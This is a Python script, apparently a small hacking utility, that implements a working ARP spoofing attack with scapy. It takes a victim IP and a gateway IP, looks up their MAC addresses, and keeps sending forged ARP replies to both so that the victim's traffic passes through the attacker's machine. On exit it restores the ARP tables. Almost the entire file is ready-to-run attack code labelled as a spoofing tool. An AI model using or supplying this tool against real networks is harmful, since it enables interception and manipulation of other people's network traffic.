from os import getuid
import argparse
import textwrap
import sys
import scapy.all as scapy
import time


# Setting colors for the output
# to make it easier to read
underline='\033[4m'
remove_underline='\033[24m'
color_block='\033[38;5;'
color_34=f'{color_block}34m'
color_75=f'{color_block}75m'
color_160=f'{color_block}160m'
color_123=f'{color_block}123m'
color_124=f'{color_block}124m'
color_139=f'{color_block}139m'
color_145=f'{color_block}145m'
color_146=f'{color_block}146m'
color_196=f'{color_block}196m'
color_251=f'{color_block}251m'
reset_colors='\033[0m'

def arp_parser():
    arp_parser=argparse.ArgumentParser(
        'arp',
        description=f"{color_251}Simple ARP spoofing tool{color_146}",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
        f"""{color_145}Example:
        nc.py arp -v 192.168.1.31 -i wlan0 -g 192.168.1.1{reset_colors}
        """
        )
        )
    arp_parser.add_argument('-v','--victim',help='Set the victim\'s ip address',required=True)
    arp_parser.add_argument('-g','--gateway',default='192.168.1.1',help='Set the gateway\'s ip address')
    arp_parser.add_argument('-i','--interface',help='Set the interface name',required=True)  

    return arp_parser  


def Check_root():
    if getuid()!=0: # when running arp spoof you must be root
        print(f"{color_124}{underline}This script must be run as root.{reset_colors}")
        sys.exit(1)

class ArpSpoofer:
    def __init__(self,args):
        self.interface=args.interface
        self.victim_mac=None
        self.victim_ip=args.victim
        self.gateway_mac=None
        self.gateway_ip=args.gateway

        
    def get_mac(self,ip):
        request=scapy.ARP(pdst=ip)
        broadcast=scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet=broadcast/request
        
        # If an arp reply is not received, either retry sending the request or stop the attack
        while True: 
            answer=scapy.srp(final_packet,iface=self.interface,timeout=2,verbose=False)[0]
            if not answer:
                print(f'{color_160}No arp reply was received.{reset_colors}\n{color_251}Try Again? [y/n]:{reset_colors}',end='')
                Ans=input().lower()
                if Ans=="y"or Ans=="yes":
                    continue
                sys.exit(1)
            return answer[0][1].hwsrc

    def spoof(self): 
        packet_for_victim=scapy.Ether(dst=self.victim_mac)/scapy.ARP(
            pdst=self.victim_ip,
            hwdst=self.victim_mac,
            psrc=self.gateway_ip,
            op=2 
            )
        
        packet_for_gateway=scapy.Ether(dst=self.gateway_mac)/scapy.ARP(
            pdst=self.gateway_ip,
            hwdst=self.gateway_mac,
            psrc=self.victim_ip,
            op=2
        )

        scapy.sendp(packet_for_victim, iface=self.interface, verbose=False)
        print(f"{color_251}Spoofing {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251} pretending to be {color_196}{underline}{self.victim_ip}{remove_underline}{color_251}...{reset_colors}")
        
        scapy.sendp(packet_for_gateway,iface=self.interface,verbose=False)
        print(f"{color_251}Spoofing {color_196}{underline}{self.victim_ip}{remove_underline}{color_251} pretending to be {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251}...{reset_colors}")

    def restore(self):
        # restoring the Gateway
        packet=scapy.Ether(dst=self.gateway_mac)/scapy.ARP(psrc=self.victim_ip,hwsrc=self.victim_mac,pdst=self.gateway_ip,hwdst=self.gateway_mac, op=2)
        for _ in range(10):
            scapy.sendp(packet,iface=self.interface,verbose=False)
            print(f'\r{color_251}Restoring {color_123}{underline}{self.gateway_ip}{remove_underline}{color_251} to its original state.{reset_colors}',flush=True,end='')
            time.sleep(0.1)
        print(f'\n{color_34}Done.{reset_colors}')

        # Restoing the Victim
        packet=scapy.Ether(dst=self.victim_mac)/scapy.ARP(psrc=self.gateway_ip,hwsrc=self.gateway_mac,pdst=self.victim_ip,hwdst=self.victim_mac,op=2)
        for _ in range(10):
            scapy.sendp(packet,iface=self.interface,verbose=False)
            print(f'\r{color_251}Restoring {color_196}{underline}{self.victim_ip}{remove_underline}{color_251} to its original state.{reset_colors}',flush=True,end='')
            time.sleep(0.1)
        print(f'\n{color_34}Done.{reset_colors}')
        return
    
    def run(self):
        self.gateway_mac=self.get_mac(self.gateway_ip)
        self.victim_mac=self.get_mac(self.victim_ip)
        try:
            while True:
                self.spoof()
                time.sleep(0.5)
        except KeyboardInterrupt:
            print(f"\n{color_251}Stopping...{reset_colors}")
        finally:
            self.restore()

def main():
    parser = arp_parser()
    args = parser.parse_args()

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(0)
    
    Check_root()
    spoofer=ArpSpoofer(args)
    spoofer.run()

if __name__ == "__main__":
    main()